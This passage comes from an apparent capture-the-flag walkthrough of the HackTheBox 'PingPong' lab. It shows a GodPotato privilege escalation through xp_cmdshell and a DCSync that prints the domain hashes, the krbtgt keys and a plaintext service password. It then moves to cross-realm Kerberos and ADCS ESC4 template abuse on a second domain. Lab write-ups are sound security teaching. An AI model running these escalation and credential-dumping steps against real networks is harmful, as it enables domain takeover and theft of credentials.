----------------------
NULL
Privilege Name                Description                               State
============================= ========================================= ========   
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeMachineAccountPrivilege     Add workstations to domain                Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   
NULL
```

This can be abused with the potato exploits.

#### GodPotato

I’ll grab the latest release of [GodPotato](https://github.com/BeichenDream/GodPotato/releases) and upload it to DC2 using the shell as c.carlssen. Since it’s uploaded as c.carlssen but needs to run as svc_sql, I’ll make sure all users can read and execute it:

```
evil-winrm-py PS C:\programdata> upload GodPotato-NET4.exe gp.exe
Uploading ~/hackthebox/pingpong/GodPotato-NET4.exe: 100%|████████████| 56.0k/56.0k [00:01<00:00, 44.8kB/s]
[+] File uploaded successfully as: C:\programdata\gp.exe
evil-winrm-py PS C:\programdata> icacls .\gp.exe /grant Everyone:RX
processed file: .\gp.exe
Successfully processed 1 files; Failed processing 0 files
```

Now I’ll run it:

```css
SQL (pong\P.Reiner  dbo@master)> xp_cmdshell C:\ProgramData\gp.exe -cmd "whoami"
output
--------------------------------------------------------------------------------   
[*] CombaseModule: 0x140708419600384
[*] DispatchTable: 0x140708422187336
[*] UseProtseqFunction: 0x140708421479968
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\c22f97f5-ffa6-4fdd-a263-c2ab78f58c8b\pipe\epmapper    
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000ec02-0b38-ffff-124e-3ebf66c16401
[*] DCOM obj OXID: 0xdb5797a5e36bb6b7
[*] DCOM obj OID: 0xa2f371f8dd5e24af
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 904 Token:0x760  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 284
nt authority\system
NULL
```

It ran as system! I’ll run again and add c.carlssen to the local Administrators group. On a domain controller, the local Administrators group is the domain’s BUILTIN\\Administrators group, which has the rights needed to DCSync:

```
SQL (pong\P.Reiner  dbo@master)> xp_cmdshell C:\ProgramData\gp.exe -cmd "net localgroup administrators c.carlssen /add"
output
--------------------------------------------------------------------------------   
[*] CombaseModule: 0x140708419600384
[*] DispatchTable: 0x140708422187336
[*] UseProtseqFunction: 0x140708421479968
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\061c170b-b600-4aec-9153-ea416582ecbe\pipe\epmapper    
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00005402-0948-ffff-ff55-2b14ecbfac0b
[*] DCOM obj OXID: 0x7a7e346e4e0586f3
[*] DCOM obj OID: 0x3860c2feff27a56d
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 904 Token:0x760  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation   
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 3776
The command completed successfully.
NULL
NULL
```

Now c.carlssen shows as admin on DC2:

```sql
oxdf@hacky$ KRB5CCNAME=c.carlssen.ccache proxychains -q netexec smb DC2.pong.htb --use-kcache
SMB         DC2.pong.htb    445    DC2              [*]  x64 (name:DC2) (domain:pong.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         DC2.pong.htb    445    DC2              [+] PONG.HTB\c.carlssen from ccache (Pwn3d!)
```

And I can DCSync:

```swift
oxdf@hacky$ KRB5CCNAME=c.carlssen.ccache proxychains -q secretsdump.py -k -no-pass dc2.pong.htb
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xdee71f7ea0e118519be7765b9db41a65
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a24454d98e39a4a6d022b5d3e64c9e71:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
pong\DC2$:aes256-cts-hmac-sha1-96:486c88bea5be139e8a271864ac2ff0216d7ccb003b5eb61f2976071490515848
pong\DC2$:aes128-cts-hmac-sha1-96:debc5c93eb20fca6eb01887a5f2104a8
pong\DC2$:des-cbc-md5:19fbeffee3525b3e
pong\DC2$:plain_password_hex:64349515ca8aa48c1bda29023b423f5a8f46f50e2f28b37107f445781b64697dedd29b93a3b87e4acd6c624f9007a491512fce15fe7a59aacaea270c93c5c428464f0f730aebcc66bbadb36a93afa8cb82656e5ac1ab01d69bcccb030934f774bd0131135528f790883abfd3d00588a8600fd24cd722c0a4bc47ba43236d430caf04de2fc8410943e18a9a082df054429bf31043d6f69387bc43a855e3e550950054967cba3895bb36794c52aa78d2aa7e04e6e4c8adea63bd5b23146f055792c5bc3aa444abd35f2df404fff90989cfcc7fbc68f7f12174f77b454cbec13f206608970f5737350ff2ebf0acc8f440a8
pong\DC2$:aad3b435b51404eeaad3b435b51404ee:e12246a7e57232eec29791ba3273a5b9:::
[*] DPAPI_SYSTEM
dpapi_machinekey:0x3fc94174d83a1bc9db957259e29130a9e19ccbef
dpapi_userkey:0xaa394100f064e1d1a6e0ad4366e0ea391358ba52
[*] NL$KM
 0000   04 44 D9 97 85 D7 4A 1F  C5 A3 4E 26 3C 19 05 D1   .D....J...N&<...
 0010   D9 A3 20 EA 3A B3 AA A2  AC B1 30 76 BE 34 25 11   .. .:.....0v.4%.
 0020   27 03 89 80 C7 2C C3 FF  36 71 63 EA 9C ED 92 C7   '....,..6qc.....
 0030   8C 3B 31 75 38 96 2B 6E  D9 DB 61 30 D9 11 B3 63   .;1u8.+n..a0...c
NL$KM:0444d99785d74a1fc5a34e263c1905d1d9a320ea3ab3aaa2acb13076be34251127038980c72cc3ff367163ea9ced92c78c3b317538962b6ed9db6130d911b363
[*] _SC_MSSQLSERVER
PONG\svc_sql:This!IsAServi@ceA1231ccount
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b8ebfb6e9972babf9c01311748261a8:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2850c6e9dfa66b220c3e013edbb23580:::
C.Carlssen:1110:aad3b435b51404eeaad3b435b51404ee:e15edce7e905644a94f0c34a0b05104e:::
M.Sun:1111:aad3b435b51404eeaad3b435b51404ee:deccbc15ace5cbf2d902f441783f1115:::
Z.Zhen:1112:aad3b435b51404eeaad3b435b51404ee:df023cb090b82c55e3e18e5fbc7f9bc3:::
A.Pearson:1113:aad3b435b51404eeaad3b435b51404ee:9a9250fa13ba7f4c25e1a5576f5b8a03:::
P.Sanchez:1114:aad3b435b51404eeaad3b435b51404ee:5261d93d06680fc00db5454eff3bcfc0:::
H.Gordon:1115:aad3b435b51404eeaad3b435b51404ee:2dc83c2f510d420be2bf3692e9cb7371:::
P.Reiner:1116:aad3b435b51404eeaad3b435b51404ee:6fa016af828999bda0e26861e00afb31:::
C.Adam:1117:aad3b435b51404eeaad3b435b51404ee:3dbc49f649cd0ed23ecd7d5071bcf00b:::
R.Rupert:1118:aad3b435b51404eeaad3b435b51404ee:8960e808108c23470cea0551d0399e8f:::
svc_sql:1119:aad3b435b51404eeaad3b435b51404ee:9e5de13bde362ad5cc68a49d26301c3b:::
svc_print:1120:aad3b435b51404eeaad3b435b51404ee:e21d90eb3c651f4bfdf6606a4c07ffd5:::
svc_ldap:1121:aad3b435b51404eeaad3b435b51404ee:f49491f9d40172069146a9c907e4d510:::
R.Martinelli:1124:aad3b435b51404eeaad3b435b51404ee:d60fc26a0569b953a5cebd1392232630:::
DC2$:1000:aad3b435b51404eeaad3b435b51404ee:e12246a7e57232eec29791ba3273a5b9:::
Pong_gMSA$:1123:aad3b435b51404eeaad3b435b51404ee:989bd748ac8dd0b71ab24edccc9fc012:::
PING$:1103:aad3b435b51404eeaad3b435b51404ee:683ca376d7f86eea6472e88bf62d99c6:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:eb76ed05ee09e812ac2b1328f5b846afeafe69f9a1ba13f94f50ab3d8d524559
Administrator:aes128-cts-hmac-sha1-96:3ca116fdd0d280d751be4efee3eeea7b
Administrator:des-cbc-md5:25ab7c5498ef6df1
krbtgt:aes256-cts-hmac-sha1-96:6282e2af4ca8f5ca935f84d03b486f2e6cc2a9b5c87fb0637a4449a44a8cd5f8
krbtgt:aes128-cts-hmac-sha1-96:f1dc39ca727289c857163fb606b5aa41
krbtgt:des-cbc-md5:6702c7679d2949ef
C.Carlssen:aes256-cts-hmac-sha1-96:1fc4a69c646ad7fe6537eedf7d08e55c93143cf4dd32ec1d27fcd9d007cb78ba
C.Carlssen:aes128-cts-hmac-sha1-96:69ba981c227f43ae62ce4ce3f60389f4
C.Carlssen:des-cbc-md5:648c5e25761973c7
M.Sun:aes256-cts-hmac-sha1-96:653c8cb750f25f9d74c0477616e542d5430cf6bee994b50161cf5d52f3bedfd0
M.Sun:aes128-cts-hmac-sha1-96:8f07ec02fc56a32150d23fd0dbc353a3
M.Sun:des-cbc-md5:105ea16e20762aa2
Z.Zhen:aes256-cts-hmac-sha1-96:208f13a06970095f1edd7942478afd6d34f3b3ccddcae627fdfc00c1b22502b8
Z.Zhen:aes128-cts-hmac-sha1-96:b89193e73905053e95fb2ad3b340cfdb
Z.Zhen:des-cbc-md5:1c8a257962dccdb5
A.Pearson:aes256-cts-hmac-sha1-96:537543f5f783db4a10f4df73e87ec7df9c692df7d970e3ee4be08c76fa53d5e7
A.Pearson:aes128-cts-hmac-sha1-96:a3a9b0fa5a8dab39c2971bab470386a7
A.Pearson:des-cbc-md5:3becd6ae4a26bf89
P.Sanchez:aes256-cts-hmac-sha1-96:12fb2b9eb168304707d6ef260269445089928f2861a8f58e54fea85e9ab5309e
P.Sanchez:aes128-cts-hmac-sha1-96:b0f0baa47311cee88ca2b52b4e8ceb49
P.Sanchez:des-cbc-md5:83dc2cc7fb5dfb57
H.Gordon:aes256-cts-hmac-sha1-96:f540010f801f234d6e1373e5a628184bf658f87f8ac510ad772300d883b300a0
H.Gordon:aes128-cts-hmac-sha1-96:24977a9c20ff0ae29914f4f882d9b0db
H.Gordon:des-cbc-md5:1a7af2c83d46e9cd
P.Reiner:aes256-cts-hmac-sha1-96:558139b55509c8a6fefe5f493f7a316cd6ab23b6eb1770c4a81934f25b6b700d
P.Reiner:aes128-cts-hmac-sha1-96:3e6a72a9be1789fd6ea0b8b9b3306c19
P.Reiner:des-cbc-md5:d5bad657b55132df
C.Adam:aes256-cts-hmac-sha1-96:647d77f0b0b0ebd22689a316339a4242044556182e3fb3c2b7bc5ffc29b1b8c4
C.Adam:aes128-cts-hmac-sha1-96:e550f93fa28e7d7196d98534c1a787ea
C.Adam:des-cbc-md5:806dc84034e6dcef
R.Rupert:aes256-cts-hmac-sha1-96:c0dfecbe5140831b99750a5c68f3ea55e3474d15caa3cc684c9a5c0be8fc4eab
R.Rupert:aes128-cts-hmac-sha1-96:e034d0c375a79fa55f36bad49760fabf
R.Rupert:des-cbc-md5:9dbca10268fddc07
svc_sql:aes256-cts-hmac-sha1-96:04268c99f2fa7c1494eb690f151dbca811659fbb2f91507af68d14ea767299a4
svc_sql:aes128-cts-hmac-sha1-96:e2823bb8675e717c06220991e69ac1b6
svc_sql:des-cbc-md5:1c3bbf5145863858
svc_print:aes256-cts-hmac-sha1-96:f9bd97d0d297630c1b1e85dd2a94a827332e2328d74141a6bafa0aa00aec0544
svc_print:aes128-cts-hmac-sha1-96:9b87341cfde9d6f5832be8fc6718126f
svc_print:des-cbc-md5:765b3434f7e9312c
svc_ldap:aes256-cts-hmac-sha1-96:cfad16d6a69c32b7a78a203485f740d132fb8713d1477d81162eac62ced1bf0b
svc_ldap:aes128-cts-hmac-sha1-96:17b3dbc9341f30adf89d67285bc5cb88
svc_ldap:des-cbc-md5:5792c71945c80bd9
R.Martinelli:aes256-cts-hmac-sha1-96:61e48d17cfe9507a3095dfb84b218a4b803aa0984b123e432bc2a40fc5f7fe98
R.Martinelli:aes128-cts-hmac-sha1-96:14f94b4b3deaabde802460945a2079e9
R.Martinelli:des-cbc-md5:8c437f1f578f3b3b
DC2$:aes256-cts-hmac-sha1-96:486c88bea5be139e8a271864ac2ff0216d7ccb003b5eb61f2976071490515848
DC2$:aes128-cts-hmac-sha1-96:debc5c93eb20fca6eb01887a5f2104a8
DC2$:des-cbc-md5:16abe5405d2f51ef
Pong_gMSA$:aes256-cts-hmac-sha1-96:725f29ca3b45942c57a4e8576532f0262c55edfdce59bdcd4b411f4566ea1aa6
Pong_gMSA$:aes128-cts-hmac-sha1-96:97cefa17dcaec66d9b52a97be398acf0
Pong_gMSA$:des-cbc-md5:c15b80f26dd3ce6b
PING$:aes256-cts-hmac-sha1-96:82d32219592d02188c9b9149308e5fb17185b4b44ebffa3b0681a189c7b7a523
PING$:aes128-cts-hmac-sha1-96:d60175bfd5eb36551cd4a094fadb06ea
PING$:des-cbc-md5:5829baa44f6783df
[*] Cleaning up...
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up...
[*] Stopping service RemoteRegistry
Exception ignored in: <function Registry.__del__ at 0x7ae9de170d60>
Traceback (most recent call last):
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/winregistry.py", line 172, in __del__
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/winregistry.py", line 169, in close
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/examples/secretsdump.py", line 410, in close
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/smbconnection.py", line 633, in closeFile
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/smb3.py", line 1364, in close
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/smb3.py", line 474, in sendSMB
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/smb3.py", line 443, in signSMB
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/crypto.py", line 150, in AES_CMAC
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/Cryptodome/Cipher/AES.py", line 229, in new
KeyError: 'Cryptodome.Cipher.AES'
Exception ignored in: <function Registry.__del__ at 0x7ae9de170d60>
Traceback (most recent call last):
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/winregistry.py", line 172, in __del__
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/winregistry.py", line 169, in close
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/examples/secretsdump.py", line 410, in close
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/smbconnection.py", line 633, in closeFile
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/smb3.py", line 1364, in close
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/smb3.py", line 474, in sendSMB
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/smb3.py", line 443, in signSMB
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/impacket/crypto.py", line 150, in AES_CMAC
  File "/home/oxdf/.local/share/uv/tools/impacket/lib/python3.13/site-packages/Cryptodome/Cipher/AES.py", line 229, in new
KeyError: 'Cryptodome.Cipher.AES'
```

![expand](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d003c6ff7b8f3bed.png)

That’s a complete compromise of the `PONG.HTB` domain.

## Shell as Administrator on DC1

### Enumeration

If I use BloodHound’s Pathfinding to go from a compromised `pong.htb` to `ping.htb`, it finds a path easily:

![BloodHound path from pong.htb through r.martinelli, a member of CA Managers on ping.htb, which has an ADCSESC4 edge to the ping.htb domain](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/7e72505a8ba2b66f.png)

![BloodHound path from pong.htb through r.martinelli, a member of CA Managers on ping.htb, which has an ADCSESC4 edge to the ping.htb domain](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/htb-pingpong-7e72505a8ba2.webp)

r.martinelli is a member of CA Managers on `ping.htb`, which can execute ESC4 against the domain.

### Auth as r.martinelli

I’ll get a TGT as r.martinelli using the AES key dumped from `pong.htb`:

```
oxdf@hacky$ proxychains getTGT.py pong.htb/r.martinelli -aesKey 61e48d17cfe9507a3095dfb84b218a4b803aa0984b123e432bc2a40fc5f7fe98
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  PONG.HTB:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  PONG.HTB:88  ...  OK
[*] Saving ticket in r.martinelli.ccache
```

It works on DC2:

```sql
oxdf@hacky$ KRB5CCNAME=r.martinelli.ccache proxychains -q netexec smb dc2.pong.htb --use-kcache
SMB         dc2.pong.htb    445    dc2              [*]  x64 (name:dc2) (domain:pong.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
SMB         dc2.pong.htb    445    dc2              [+] PONG.HTB\r.martinelli from ccache 
```

It also works on DC1:

```css
oxdf@hacky$ KRB5CCNAME=r.martinelli.ccache proxychains netexec smb dc1.ping.htb --use-kcache
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.128.220:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.128.220:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.128.220:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.128.220:135  ...  OK
SMB         dc1.ping.htb    445    dc1              [*]  x64 (name:dc1) (domain:ping.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.128.220:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  PONG.HTB:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  PING.HTB:88  ...  OK
SMB         dc1.ping.htb    445    dc1              [+] PONG.HTB\r.martinelli from ccache
```

It’s worth noticing what `netexec` does here. It reaches out to `pong.htb` and then to `ping.htb`. This is a cross-realm referral. After the SMB connections on 445 and 135, it reaches out to DC2 to ask for a referral ticket for `krbtgt/PING.HTB@PONG.HTB`, and then presents that ticket to DC1 asking for the service ticket it needs (in this case `cifs/dc1.ping.htb@PING.HTB`).

### ESC4

#### Background

ESC4 just says that the user has full control over the template. That means as that user, I can edit the template so that it’s vulnerable to something else, typically ESC1 (which allows users to request a certificate on behalf of any other user). I’ve covered this before in [HTB: Sendai](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html#esc4), [HTB: Infiltrator](https://0xdf.gitlab.io/2025/06/14/htb-infiltrator.html#esc4-exploit), and [HTB: EscapeTwo](https://0xdf.gitlab.io/2025/05/24/htb-escapetwo.html#esc4-via-esc1).

#### Enumeration

BloodHound shows ESC4 as a path to `PING.HTB`. I’ll try to use `certipy` to verify that, but it fails:

```css
oxdf@hacky$ KRB5CCNAME=r.martinelli.ccache proxychains certipy find -vulnerable -stdout -k -target dc1.ping.htb -dc-host dc1.ping.htb 
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: dc1.ping.htb.
[!] Use -debug to print a stacktrace
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.128.220:636  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.128.220:88  ...  OK
[-] Kerberos error: Kerberos SessionError: KDC_ERR_WRONG_REALM(Reserved for future use) (Error code: 68)
[-] Got error: Kerberos SessionError: KDC_ERR_WRONG_REALM(Reserved for future use)
[-] Use -debug to print a stacktrace
```

`certipy` doesn’t try to get the referral ticket, and it’s failing because I’m submitting a `PONG.HTB` ticket to `PING.HTB`.

`bloodyAD get writable` crashes in a similar way:

```python
oxdf@hacky$ KRB5CCNAME=r.martinelli.ccache proxychains -q bloodyAD --host DC1.ping.htb -d ping.htb -k get writable
Traceback (most recent call last):
  File "/home/oxdf/.local/share/uv/tools/bloodyad/lib/python3.13/site-packages/badauth/protocols/kerberos/client/native.py", line 144, in authenticate
    raise err
  File "/home/oxdf/.local/share/uv/tools/bloodyad/lib/python3.13/site-packages/kerbad/aioclient.py", line 399, in tgs_from_ccache
    tgs, keystruct, err = self.ccache.get_tgs(spn_user)
                          ~~~~~~~~~~~~~~~~~~~^^^^^^^^^^
  File "/home/oxdf/.local/share/uv/tools/bloodyad/lib/python3.13/site-packages/kerbad/common/ccache.py", line 657, in get_tgs
    return tgss[0][0], tgss[0][1], None
           ~~~~^^^
IndexError: list index out of range

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/oxdf/.local/bin/bloodyAD", line 10, in <module>
    sys.exit(main())
             ~~~~^^
  File "/home/oxdf/.local/share/uv/tools/bloodyad/lib/python3.13/site-packages/bloodyAD/main.py", line 342, in main
    asyncio.run(amain())
    ~~~~~~~~~~~^^^^^^^^^
  File "/home/oxdf/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/asyncio/runners.py", line 195, in run
    return runner.run(main)
           ~~~~~~~~~~^^^^^^
  File "/home/oxdf/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/asyncio/runners.py", line 118, in run
    return self._loop.run_until_complete(task)
           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^
  File "/home/oxdf/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/asyncio/base_events.py", line 725, in run_until_complete
    return future.result()
           ~~~~~~~~~~~~~^^
  File "/home/oxdf/.local/share/uv/tools/bloodyad/lib/python3.13/site-packages/bloodyAD/main.py", line 268, in amain
    async for entry in result:
        print_human_entry(entry)
  File "/home/oxdf/.local/share/uv/tools/bloodyad/lib/python3.13/site-packages/bloodyAD/cli_modules/get.py", line 551, in writable
    root_ldap = await conn.getLdap()
                ^^^^^^^^^^^^^^^^^^^^
  File "/home/oxdf/.local/share/uv/tools/bloodyad/lib/python3.13/site-packages/bloodyAD/network/config.py", line 156, in getLdap
    self._ldap = await Ldap.create(self)
                 ^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/oxdf/.local/share/uv/tools/bloodyad/lib/python3.13/site-packages/bloodyAD/network/ldap.py", line 216, in create
    raise e
  File "/home/oxdf/.local/share/uv/tools/bloodyad/lib/python3.13/site-packages/bloodyAD/network/ldap.py", line 204, in create
    raise err
  File "/home/oxdf/.local/share/uv/tools/bloodyad/lib/python3.13/site-packages/badldap/connection.py", line 436, in bind
    raise err
  File "/home/oxdf/.local/share/uv/tools/bloodyad/lib/python3.13/site-packages/badauth/protocols/kerberos/client/native.py", line 175, in authenticate
    tgs, encpart, self.session_key = await self.kc.with_clock_skew(self.kc.get_TGS, spn)#, override_etype = self.preferred_etypes)
                                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/oxdf/.local/share/uv/tools/bloodyad/lib/python3.13/site-packages/kerbad/aioclient.py", line 1003, in with_clock_skew
    return await func(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/oxdf/.local/share/uv/tools/bloodyad/lib/python3.13/site-packages/kerbad/aioclient.py", line 497, in get_TGS
    raise KerberosError(rep, 'get_TGS failed!')
kerbad.protocol.errors.KerberosError: get_TGS failed! Error Name: KDC_ERR_WRONG_REALM Detail: "Incorrect domain or principal"
```

![expand](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/d003c6ff7b8f3bed.png)

It’s failing at the cross domain authentication. On a fresh TGT the cache looks like:

```swift
oxdf@hacky$ KRB5CCNAME=r.martinelli.ccache klist
Ticket cache: FILE:r.martinelli.ccache
Default principal: r.martinelli@PONG.HTB

Valid starting       Expires              Service principal
11/16/2026 23:20:22  11/17/2026 09:20:22  krbtgt/PONG.HTB@PONG.HTB
        renew until 11/17/2026 23:20:16
```

`kvno` will fetch a service ticket into the cache:

```swift
oxdf@hacky$ KRB5CCNAME=r.martinelli.ccache proxychains -q kvno ldap/DC1.ping.htb
ldap/DC1.ping.htb@PING.HTB: kvno = 7
oxdf@hacky$ KRB5CCNAME=r.martinelli.ccache klist
Ticket cache: FILE:r.martinelli.ccache
Default principal: r.martinelli@PONG.HTB

Valid starting       Expires              Service principal
11/16/2026 23:20:22  11/17/2026 09:20:22  krbtgt/PONG.HTB@PONG.HTB
        renew until 11/17/2026 23:20:16
11/16/2026 23:22:04  11/17/2026 09:20:22  krbtgt/PING.HTB@PONG.HTB
        renew until 11/17/2026 23:20:16
11/16/2026 23:22:04  11/17/2026 09:20:22  ldap/DC1.ping.htb@PING.HTB
        renew until 11/17/2026 23:20:16
```

`kvno` uses the system Kerberos library, which follows the referral. With the `ldap/DC1.ping.htb` ticket already in the cache, `bloodyAD` uses it directly and never makes the cross-realm request itself. Now `bloodyAD` shows the SmartcardAuthentication template as writable:

```css
oxdf@hacky$ KRB5CCNAME=r.martinelli.ccache proxychains -q bloodyAD --host DC1.ping.htb -d ping.htb -k get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=ping,DC=htb
permission: WRITE

distinguishedName: CN=S-1-5-21-2410575906-3092493790-2123333151-1124,CN=ForeignSecurityPrincipals,DC=ping,DC=htb
permission: WRITE

distinguishedName: CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb
permission: WRITE
OWNER: WRITE
DACL: WRITE

distinguishedName: DC=ping.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=ping,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.ping.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=ping,DC=htb
permission: CREATE_CHILD
```

#### Abuse Manually

With write permissions on the template, I can enable ESC1, which requires:

-   Enrollee Supplies Subject
-   Client Authentication

Checking a `certipy find` run (by a `ping.htb` user, without `-vulnerable`) shows the following about the template in question:

```yaml
Certificate Templates
  0
    Template Name                       : SmartcardAuthentication
    Display Name                        : Smartcard Authentication
    Certificate Authorities             : ping-DC1-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 100 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-01-17T15:39:18+00:00
    Template Last Modified              : 2026-01-17T15:39:37+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : PING.HTB\Administrator
        Full Control Principals         : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        Write Owner Principals          : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        Write Dacl Principals           : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
        Write Property Enroll           : PING.HTB\Domain Admins
                                          PING.HTB\Enterprise Admins
```

